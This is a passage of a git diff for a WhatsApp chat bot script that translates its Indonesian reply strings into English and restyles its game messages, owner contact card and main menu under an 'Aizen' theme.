 hydro.tebakkalimat = hydro.tebakkalimat ? hydro.tebakkalimat : {};
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
 jawaban = tebakkalimat[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
- hydro.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
+ hydro.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `⚔️ *Guess The Sentence*
+
+✅ *Correct Answer!*
+
+🎮 Play again?
+Type *GuessSentence*`}, {quoted:m}) 
  delete tebakkalimat[m.sender.split('@')[0]]
-} else console.log('*Jawaban Salah!*')
+} else console.log('*Wrong answer!*')
 }
 function generateSN(length = 8) { 
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -3748,11 +3854,16 @@ let json = JSON.parse(JSON.stringify(hydro.tebaklirik[id][1]))
  if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 user.money += hydro.tebaklirik[id][2]
  global.db.users[m.sender].exp += 10
-   var teks = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${hydro.tebaklirik[id][2]} Money 💸\n EXP: +10`
-  replyhydro(`${teks}`)
+   var teks = `⚔️ *Guess The Lyrics*
+
+✅ *Correct Answer!*
+
+💰 Reward: *+${hydro.tebaklirik[id][2]} Money* 💸
+⚡ EXP: +10`
+replyhydro(teks)
  clearTimeout(hydro.tebaklirik[id][3])
  delete hydro.tebaklirik[id]
- } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyhydro(`*Dikit Lagi!*`)
+ } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyhydro(`*A little more!*`)
 // else reply(`*Salah!*`)
  }
 //=========================================\\
@@ -3761,9 +3872,14 @@ if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
 jawaban = tebaktebakan[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
- hydro.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
+ hydro.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `⚔️ *Guess The Riddle*
+
+✅ *Correct Answer!*
+
+🎮 Play again?
+Type *GuessRiddle*`}, {quoted:m}) 
  delete tebaktebakan[m.sender.split('@')[0]]
-} else console.log('*Jawaban Salah!*')
+} else console.log('*Wrong answer!*')
 }
 //menu thingy
 const timestamp = speed()
@@ -3814,10 +3930,15 @@ if (isCmd && !m.key.fromMe) {
     
     if (user && !user.registered && restrictedCmds.includes(command)) {
         return hydro.sendMessage(m.chat, {
-            text: `⚠️ Kamu belum terdaftar!\nSilakan melakukan *${prefix}daftar nama,umur*`,
+            text: `⚔️ *Access Denied*
+
+⚠️ You are not registered.
+
+📌 Register using:
+*${prefix}register name,age*`, 
             contextInfo: {
                 externalAdReply: {
-                    title: "Akses Ditolak",
+                    title: "Acess Denied!",
                     body: `Powered By ${botname}`,
                     thumbnailUrl: global.thumbnail,
                     mediaType: 1,
@@ -3834,19 +3955,32 @@ if (global.tebakanml[m.sender]) {
     let poin = global.tebakanml[m.sender].poin
 
     if (budy.toLowerCase() === jawaban) {
-        reply(`🎉 Jawaban Benar!\n+${poin} XP\nJawaban: *${jawaban}*`)
+        reply(`⚔️ *Response Verified*
+
+✅ Correct Answer!
+⚡ +${poin} XP
+
+📌 Answer:
+*${jawaban}*`)
         if (!global.db.users[m.sender]) global.db.users[m.sender] = { exp: 0 }
         global.db.users[m.sender].exp += poin
         delete global.tebakanml[m.sender]
-    } else if (budy.toLowerCase() === 'nyerah') {
-        reply(`❌ Menyerah ya?\nJawabannya adalah: *${jawaban}*`)
+    } else if (["nyerah", "surrender"].includes(budy.toLowerCase())) {
+    reply(`⚔️ *Game Terminated*
+
+💢 You surrendered.
+
+📌 Correct Answer:
+*${jawaban}*`)
         delete global.tebakanml[m.sender]
     }
 }
 
 if (m.isGroup && disablecmd[m.chat] && disablecmd[m.chat][command]) {
     if (disablecmd[m.chat][command].noreply) return;
-    return replyhydro(`⛔ Fitur *${command}* sedang dinonaktifkan oleh admin di grup ini.`);
+    return replyhydro(`⚔️ *Access Restricted*
+
+⛔ Feature *${command}* has been disabled by the group admin.`);
 }
 
 switch (command) {
@@ -3921,9 +4055,13 @@ Type *surrender* to surrender and admit defeat`
             if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replyhydro(`Complete your previous game`)
 	    if (m.mentionedJid[0] === m.sender) return replyhydro(`Can't play with myself !`)
             if (!m.mentionedJid[0]) return replyhydro(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
-            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replyhydro(`Orang yang Anda tantang sedang bermain sesuai dengan orang lain :(`)
-            let id = 'suit_' + new Date() * 1
-            let caption = `_*SUIT PvP*_
+            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replyhydro(`⚔️ *Match Unavailable*
+
+⛔ The player you challenged is currently in another match.`)
+
+let id = 'suit_' + new Date() * 1
+
+let caption = `⚔️ *Suit PvP*`
 
 @${m.sender.split`@`[0]} *Challenged* @${m.mentionedJid[0].split`@`[0]} *to play suit*
 
@@ -3935,7 +4073,7 @@ Type *surrender* to surrender and admit defeat`
             p2: m.mentionedJid[0],
             status: 'wait',
             waktu: setTimeout(() => {
-            if (this.suit[id]) hydro.sendText(m.chat, `_suit waktu habis_`, m)
+            if (this.suit[id]) hydro.sendText(m.chat, `_Match expired_`, m)
             delete this.suit[id]
             }, 60000), poin, poin_lose, timeout
             }
@@ -3944,48 +4082,89 @@ Type *surrender* to surrender and admit defeat`
 	case 'public': {
 if (!Ahmad) return replytolak(mess.only.owner)
 hydro.public = true
-replyhydro('*Berhasil Mengubah Ke Penggunaan Publik*')
-            }
+replyhydro(`⚔️ *System Updated*
+
+🌐 Mode: Public Access Enabled`)
+}
             break
             case 'self': {
 if (!Ahmad) return replytolak(mess.only.owner)
 hydro.public = false
-replyhydro('*Sukses Berubah Menjadi Pemakaian Sendiri*')
-            }
+replyhydro(`⚔️ *System Updated*
+
+🔒 Mode: Private (Self) Enabled`)
+}
             break
 
 case 'smeme': case 'stickermeme': case 'stickmeme': {
 if (!/webp/.test(mime) && /image/.test(mime)) {
-if (!text) return replyhydro(`Usage: ${prefix + command} text1|text2`)
-atas = text.split('|')[0] ? text.split('|')[0] : '-'
-bawah = text.split('|')[1] ? text.split('|')[1] : '-'
-mee = await hydro.downloadAndSaveMediaMessage(quoted)
-mem = await UploadFileUgu(mee)
-meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
-memek = await hydro.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
+
+if (!text) return replyhydro(`⚠️ *Usage:*
+${prefix + command} text1|text2`)
+
+let atas = text.split('|')[0] || '-'
+let bawah = text.split('|')[1] || '-'
+
+let mee = await hydro.downloadAndSaveMediaMessage(quoted)
+let mem = await UploadFileUgu(mee)
+
+let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
+
+await hydro.sendImageAsSticker(m.chat, meme, m, {
+packname: global.packname,
+author: global.author
+})
+
 } else {
-replyhydro(`Kirim/Balas Gambar Dengan Caption ${prefix + command} text1|text2`)
+replyhydro(`⚠️ *Reply to an image with caption:*
+${prefix + command} text1|text2`)
 }
 }
 break
 case 'stopjadibot': {
     try {
-        let jadibotIndex = global.conns.findIndex(hydro => hydro.decodeJid(hydro.user.id) === m.sender);
+        let jadibotIndex = global.conns.findIndex(h => 
+            h.decodeJid(h.user.id) === m.sender
+        );
+
         if (jadibotIndex === -1) {
-            return hydro.sendMessage(m.chat, { text: 'Kamu belum menjalankan jadibot atau sudah dihentikan.' }, { quoted: m });
+            return hydro.sendMessage(m.chat, {
+                text: `⚠️ *Session Not Found*
+
+You are not running a bot session or it has already been stopped.`
+            }, { quoted: m });
         }
 
         let jadibotInstance = global.conns[jadibotIndex];
-        jadibotInstance.logout();
+
+        // Logout bot
+        await jadibotInstance.logout();
+
         const rimraf = require('rimraf');
         const path = require('path');
-        rimraf.sync(path.join(__dirname, `./database/rentbot/${hydro.decodeJid(jadibotInstance.user.id)}`));
-        
+
+        // Delete session folder
+        rimraf.sync(
+            path.join(__dirname, `./database/rentbot/${hydro.decodeJid(jadibotInstance.user.id)}`)
+        );
+
+        // Remove from active connections
         global.conns.splice(jadibotIndex, 1);
 
-        hydro.sendMessage(m.chat, { text: 'Jadibot berhasil dihentikan dan sesi dihapus.' }, { quoted: m });
+        hydro.sendMessage(m.chat, {
+            text: `⚔️ *Session Terminated*
+
+✅ Jadibot successfully stopped.
+🧹 Session data has been cleared.`
+        }, { quoted: m });
+
     } catch (err) {
-        hydro.sendMessage(m.chat, { text: 'Gagal menghentikan jadibot: ' + err.message }, { quoted: m });
+        hydro.sendMessage(m.chat, {
+            text: `❌ *System Error*
+
+Failed to stop session:
+${err.message}`
+        }, { quoted: m });
     }
 }
 break;
@@ -3994,28 +4173,32 @@ if (!isPrem) return replytolak(mess.only.premium)
  jadibot(hydro, m, m.chat)
 }
 break
-case 'listjadibot': 
+case 'listjadibot':
 try {
   const rentbotPath = path.join(__dirname, './database/rentbot');
+
   let folders = fs.readdirSync(rentbotPath, { withFileTypes: true })
-                  .filter(dirent => dirent.isDirectory())
-                  .map(dirent => dirent.name);
+    .filter(dirent => dirent.isDirectory())
+    .map(dirent => dirent.name);
 
-  if (folders.length === 0) throw new Error('Belum ada pengguna yang menyewa bot');
+  if (folders.length === 0) throw new Error('⚠️ No active bot users found.');
 
-  let te = `*Rentbot List*
-
-`;
+  let te = `⚔️ *Active Bot Sessions*\n\n`;
   let mentions = [];
+
   for (let userFolder of folders) {
     let userId = await hydro.decodeJid(userFolder + '@s.whatsapp.net');
     mentions.push(userId);
-    te += ` × User : @${userId.split("@")[0]}
-`;
+
+    te += `👤 @${userId.split("@")[0]}\n`;
   }
-  hydro.sendMessage(from, { text: te, mentions: mentions }, { quoted: m });
+
+  hydro.sendMessage(from, { text: te, mentions }, { quoted: m });
+
 } catch (err) {
-  hydro.sendMessage(from, { text: err.message || 'Belum ada pengguna yang menyewa bot' }, { quoted: m });
+  hydro.sendMessage(from, {
+    text: err.message || '⚠️ No active bot users found.'
+  }, { quoted: m });
 }
 break;
 case 'clearall': {
@@ -4046,23 +4229,36 @@ case 'totalfeature':
 case 'totalfitur': 
 case 'totalcmd': 
 case 'totalcommand': 
-    replyhydro(`┌──⭓ *${botname} Total Fitur* ⭓──┐
-│
-│ 👤 Pengguna: *${pushname}*
-│ 💡 Total Fitur: *${HydroFitur()}* Command
-│ 💖 Dukunganmu sangat berarti!
-│ 🚀 Yuk bantu support dan donasi ✨
-│ agar fitur terus bertambah~ 🙌
-│
-└────⭓ Terimakasih 🔥`)
+    replyhydro(`⚔️ *AIZEN SYSTEM STATUS*
+
+👤 User: *${pushname}*
+📊 Total Commands: *${HydroFitur()}*
+
+━━━━━━━━━━━━━━━━━━
+💠 Your support keeps the system evolving.
+🚀 More power, more features, more control.
+
+💖 Consider supporting the project
+to unlock future expansions.
+
+━━━━━━━━━━━━━━━━━━
+🔥 *Thank you for using ${botname}*`)
     break
 case 'owner': {
 let name = pushname || hydro.getName(m.sender);
 let pan = `
-▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
-> *Halo Kak \`${name}\`, Tekan Tombol Yang bertuliskan Chat Owner Untuk Menghubungi Nomor Owner ku*
-▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
-`;
+╭━━━〔 👑 AIZEN OWNER 〕━━╮
+┃
+┃ 👁️ Welcome, ${name}
+┃ You’ve reached the Aizen System…
+┃ Speak only what matters.
+┃
+┃ 🚫 No spam
+┃ 🚫 No calls
+┃ ⚡ Be direct
+┃
+╰━━━━━━━━━━━━━━━━━━╯
+`.trim();
 const url = fs.readFileSync("./data/image/thumb.jpg")
 async function image(url) {
   const { imageMessage } = await generateWAMessageContent({
@@ -4096,13 +4292,13 @@ let msg = generateWAMessageFromContent(
                 body: {
                   text: `
 ┏───────────────┈ 
-┆     「 *\`[OWNER BOT]\`* 」
+┆     「 *\`[ AIZEN CONTROL ]\`* 」
 ┣───────────────┈ 
 ┣──=[ *\`[ ${global.ownername} ]\`* ]==─
-┆ • Jangan Chat Yang Aneh Aneh
-┆ • Jangan Telpon/Call Owner 
-┆ • Chat Langsung ke intinya aja
-┆ • Klo Ada Uang Minimal Bagi
+┆ • No unnecessary or irrelevant messages
+┆ • Calls are strictly prohibited
+┆ • Speak clearly and get to the point
+┆ • Respect authority and time
 └────────────┈ ⳹`
                 },
                 nativeFlowMessage: {
@@ -4125,13 +4321,13 @@ let msg = generateWAMessageFromContent(
                 body: {
                   text: `
 ┏───────────────┈ 
-┆     「 *\`[NOMOR BOT]\`* 」
+┆     「 *\`[ AIZEN NODE ]\`* 」
 ┣───────────────┈ 
 ┣──=[ *\`[ ${botname} ]\`* ]==─
-┆ • Jangan Spam Bot
-┆ • Jangan Telpon/Call Bot 
-┆ • Gaudah Chat Yg Aneh Aneh
-┆ • Beli Prem Dll Chat Owner
+┆ • Spamming is strictly prohibited
+┆ • Calls are not allowed
+┆ • Send only relevant commands
+┆ • For premium access, contact the owner
 └────────────┈ ⳹`
                 },
                 nativeFlowMessage: {
@@ -4167,217 +4363,217 @@ case 'menu': {
     let rata2 = (semuaRating.reduce((a, b) => a + b, 0) / semuaRating.length).toFixed(1);
   hydro.sendMessage(m.chat, { react: { text: `🌊`, key: m.key }})
 let teks = (`
-✨━━━〔 🏞️ *𝐌𝐞𝐧𝐮 𝐔𝐭𝐚𝐦𝐚* 〕━━━✨
+✨━━━〔 ⚔️ *𝐀𝐈𝐙𝐄𝐍 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* 〕━━━✨
 
-➤ 👤 Usᴇʀ : *${pushname}*
-➤ 👑 Rᴀɴᴋ : *${Ahmad ? 'Pemilik 👨‍💻' : isOwn ? 'Owner Panel' : isPT ? 'PT Panel' : isAdminP ? 'Admin Panel' : isReseller ? 'Reseller Panel' : isPrem ? 'Premium User' : 'Free User'}*
-➤ 👥 Tᴏᴛᴀʟ Pᴇɴɢɢᴜɴᴀ : *${Object.keys(global.db.users).length}*
-➤ ⭐ Rᴀᴛɪɴɢ : *${rata2}* dari *${semuaRating.length}* pengguna
+➤ 👤 𝐔𝐬𝐞𝐫 : *${pushname}*
+➤ 👑 𝐑𝐚𝐧𝐤 : *${Ahmad ? '𝐂𝐫𝐞𝐚𝐭𝐨𝐫 👑' : isOwn ? '𝐎𝐰𝐧𝐞𝐫 𝐏𝐚𝐧𝐞𝐥' : isPT ? '𝐄𝐥𝐢𝐭𝐞 𝐏𝐚𝐧𝐞𝐥' : isAdminP ? '𝐀𝐝𝐦𝐢𝐧' : isReseller ? '𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫' : isPrem ? '𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐞𝐫' : '𝐅𝐫𝐞𝐞 𝐔𝐬𝐞𝐫'}*
+➤ 👥 𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬 : *${Object.keys(global.db.users).length}*
+➤ ⭐ 𝐑𝐚𝐭𝐢𝐧𝐠 : *${rata2}* / *${semuaRating.length}*
 
-✨━━━〔 📱 *𝐒𝐨𝐬𝐢𝐚𝐥 𝐌𝐞𝐝𝐢𝐚* 〕━━━✨
+✨━━━〔 🌐 *𝐍𝐄𝐓𝐖𝐎𝐑𝐊* 〕━━━✨
 
-➤ 🪀 Wʜᴀᴛsᴀᴘᴘ : *wa.me/${ownernomer}*
-➤ 🌐 ʙᴜʏ ᴘᴀɴᴇʟ ᴅɪ : store.hydrohost.web.id
-➤ 📨 Tᴇʟᴇɢʀᴀᴍ : *t.me/${tele}*
-➤ 📸 ɪɴsᴛᴀɢʀᴀᴍ : *www.instagram.com/${ig}*
+➤ 📞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 : *wa.me/${ownernomer}*
+➤ 💬 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : *t.me/${tele}*
+➤ 📸 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 : *instagram.com/${ig}*
 
-✨━━━〔 🤖 *𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐁𝐨𝐭* 〕━━━✨
+✨━━━〔 🤖 *𝐀𝐈𝐙𝐄𝐍 𝐂𝐎𝐑𝐄* 〕━━━✨
 
-➤ 🤖 Nᴀᴍᴀ Bᴏᴛ : *${botname}*
-➤ ⚒️ Tᴏᴛᴀʟ : *${HydroFitur()} ғɪᴛᴜʀ*
-➤ ⏱️ Aᴋᴛɪғ Sᴇʟᴀᴍᴀ : *${runtime(process.uptime())}*
-➤ 👾 Vᴇʀsɪ : *${versiSc}*
+➤ ⚙️ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${botname}*
+➤ 📊 𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 : *${HydroFitur()}*
+➤ ⏱️ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
+➤ 🧬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : *${versiSc}*
 
-✨━━━〔 🎉 *𝐓𝐞𝐧𝐭𝐚𝐧𝐠 𝐊𝐚𝐦𝐢* 〕━━━✨
+✨━━━〔 ⚡ *𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒* 〕━━━✨
 
-ʀᴇsᴘᴏɴ ᴄᴇᴘᴀᴛ <1 ᴅᴇᴛɪᴋ!
-ʀᴜᴛɪɴ ᴘᴇɴɢᴇᴄᴇᴋᴀɴ
-sᴜᴘᴘᴏʀᴛ ᴠᴘs/ᴘᴀɴᴇʟ
+➤ ⚡ 𝐒𝐩𝐞𝐞𝐝 : Ultra Fast
+➤ 🔄 𝐒𝐭𝐚𝐛𝐢𝐥𝐢𝐭𝐲 : Optimal
+➤ 🔒 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 : Active
+➤ 🚀 𝐌𝐨𝐝𝐞 : Public
 
-╭─〔 💡 *𝐊𝐚𝐭𝐚 𝐏𝐞𝐧𝐠𝐞𝐦𝐛𝐚𝐧𝐠* 〕─╮
-│ _"Kami terus berinovasi_  
-│ _untuk memberikan pengalaman_  
-│ _terbaik dalam setiap interaksi."_
-╰────────────────────╯
+✨━━━〔 🧠 *𝐀𝐈𝐙𝐄𝐍 𝐋𝐎𝐆𝐈𝐂* 〕━━━✨
 
-🚀 *Pᴏᴡᴇʀᴇᴅ Bʏ ${botname}*
-`)
+_"Power is not given… it is taken."_
+
+_"Illusions become reality when perception is controlled."_
+
+🚀 *𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲 𝐀𝐢𝐳𝐞𝐧 𝐒𝐲𝐬𝐭𝐞𝐦*
+`).trim();
 const bet = {
   title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
           title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
-          description: "📌 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ sᴇᴍᴜᴀ ғɪᴛᴜʀ ʏᴀɴɢ ᴛᴇʀsᴇᴅɪᴀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "ᴘᴇʀᴀᴛᴜʀᴀɴ",
-          description: "🎉 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ᴀᴛᴜʀᴀɴ",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "ᴅᴏɴᴀsɪ",
-          description: "💸 ᴅᴏɴᴀsɪ ʙᴏᴛ ᴀɢᴀʀ ᴅᴀᴘᴀᴛ ʙᴇʀᴋᴇᴍʙᴀɴɢ",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴘᴇᴍɪʟɪᴋ",
-          description: "👤 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴘᴇᴍɪʟɪᴋ",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ɢʀᴏᴜᴘ",
-          description: "👥 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ɢʀᴏᴜᴘ",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ɢᴀᴍᴇ",
-          description: "🎮 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴘᴇʀᴍᴀɪɴᴀɴ",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ sʜᴏᴘ",
-          description: "🛍️ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴇʙᴇʜ",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴄᴘᴀɴᴇʟ",
-          description: "🛠️ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴘᴜsʜ", 
-          description: "💾 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴘᴜsʜ",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
-          description: "📂 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴅᴏᴇɴʟᴏᴀᴅ ɪɢ/ᴛᴛ/ʏᴛ ᴅʟʟ",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴀɪ",
-          description: "🤖 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴀɪ",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ 18+",
-          description: "🔞 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ 18+",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴀɴɪᴍʀ",
-          description: "🤍 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴀɴɪᴍᴇ",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴇᴅɪᴛ ғᴏᴛᴏ",
-          description: "🖼️ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴇᴅɪᴛғᴏᴛᴏ",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "ғɪᴛᴜʀ sᴇʀᴜ",
-          description: "🥳 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴍᴇɴʏᴇɴᴀɴɢᴋᴀɴ",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ɪsʟᴀᴍ",
-          description: "🕌 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ɪsʟᴀᴍ",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴅᴀᴛᴀʙᴀsᴇ",
-          description: "🖥️ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴅᴀᴛᴀʙᴀsʀ",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ʟᴀɪɴ-ʟᴀɪɴ",
-          description: "📪 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴛɪᴅᴀᴋ ᴅɪᴋᴀᴛᴇɢᴏʀɪᴋᴀɴ",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ʀᴘɢ",
-          description: "🧰 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ʀᴘɢ",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴄsᴜʙᴅᴏ",
-          description: "🌐 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ sᴜʙᴅᴏᴍᴀɪɴ",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴀɴᴏɴʏᴍᴏᴜsᴇ",
-          description: "👤 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴏɴʏᴍᴏᴜsᴇ",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
